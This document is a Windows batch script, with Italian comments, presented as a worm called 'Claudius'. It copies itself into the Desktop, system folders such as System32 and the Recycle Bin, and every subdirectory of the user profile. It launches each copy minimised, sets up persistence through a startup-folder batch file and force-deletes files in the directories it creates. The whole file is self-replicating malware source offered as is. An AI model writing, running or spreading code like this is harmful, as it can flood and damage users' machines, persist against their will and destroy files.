@echo off
echo Esecuzione del worm "Claudius"...
pause

REM Definire il percorso dello script e le directory di destinazione
set SCRIPT_PATH=%~f0
set TARGET_DIR=%USERPROFILE%\Desktop\Claudius_Worm

REM Funzione per gestire gli errori
:handle_error
echo Errore: %1
exit /b %2

REM Creare la directory di destinazione
mkdir "%TARGET_DIR%" 2>nul || call :handle_error "Impossibile creare la directory di destinazione." 1

REM Copiare lo script nella directory di destinazione
copy "%SCRIPT_PATH%" "%TARGET_DIR%\claudius.bat" >nul || call :handle_error "Impossibile copiare lo script nella directory di destinazione." 2

REM Simulazione di esecuzione del file copiato
echo Esecuzione del file copiato...
start "" /min "%TARGET_DIR%\claudius.bat" || call :handle_error "Impossibile eseguire il file copiato." 3

REM Creazione di file di avvio automatico
echo Creazione di file di avvio automatico...
pause
echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\claudius_startup.bat" || call :handle_error "Impossibile creare il file di avvio automatico." 4
echo echo Esecuzione di Claudius >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\claudius_startup.bat" || call :handle_error "Impossibile scrivere nel file di avvio automatico." 5

REM Potenziamento della replicazione
echo Potenziamento della replicazione...
pause

REM Directory comuni e di sistema per la replicazione
set COMMON_DIRS="C:\ProgramData\Claudius_Worm" "C:\Windows\Temp\Claudius_Worm" "C:\Users\Public\Claudius_Worm" "C:\Program Files\Claudius_Worm" "C:\Documents and Settings\Claudius_Worm"

REM Creazione e replicazione nelle directory comuni
for %%D in (%COMMON_DIRS%) do (
    mkdir %%D 2>nul || call :handle_error "Impossibile creare la directory %%D." 6
    copy "%SCRIPT_PATH%" "%%D\claudius.bat" >nul || call :handle_error "Impossibile copiare lo script in %%D." 7
    start "" /min "%%D\claudius.bat" || call :handle_error "Impossibile eseguire il file in %%D." 8
)

REM Replicazione in ogni directory e sottodirectory dell'utente
echo Replicazione in ogni directory dell'utente...
pause
for /d /r %USERPROFILE% %%D in (*) do (
    if not "%%D"=="%TARGET_DIR%" (
        mkdir "%%D\Claudius_Worm" 2>nul || call :handle_error "Impossibile creare la directory %%D\Claudius_Worm." 9
        copy "%SCRIPT_PATH%" "%%D\Claudius_Worm\claudius.bat" >nul || call :handle_error "Impossibile copiare lo script in %%D\Claudius_Worm." 10
        start "" /min "%%D\Claudius_Worm\claudius.bat" || call :handle_error "Impossibile eseguire il file in %%D\Claudius_Worm." 11
    )
)

REM Replicazione in directory di sistema e cartelle nascoste
echo Replicazione in directory di sistema e cartelle nascoste...
pause
set SYSTEM_DIRS="C:\Windows\System32\Claudius_Worm" "C:\Windows\SysWOW64\Claudius_Worm" "C:\$Recycle.Bin\Claudius_Worm" "C:\ProgramData\Claudius_Worm"

for %%D in (%SYSTEM_DIRS%) do (
    mkdir %%D 2>nul || call :handle_error "Impossibile creare la directory %%D." 12
    copy "%SCRIPT_PATH%" "%%D\claudius.bat" >nul || call :handle_error "Impossibile copiare lo script in %%D." 13
    start "" /min "%%D\claudius.bat" || call :handle_error "Impossibile eseguire il file in %%D." 14
)

REM Eliminazione di file in directory comuni e dell'utente
echo Eliminazione di file in directory comuni e dell'utente...
pause
for %%D in (%COMMON_DIRS%) do (
    del /f /q "%%D\*" 2>nul || call :handle_error "Impossibile eliminare file in %%D." 15
)
for /d /r %USERPROFILE% %%D in (Claudius_Worm) do (
    del /f /q "%%D\*" 2>nul || call :handle_error "Impossibile eliminare file in %%D." 16
)

echo Esecuzione completata.
pause
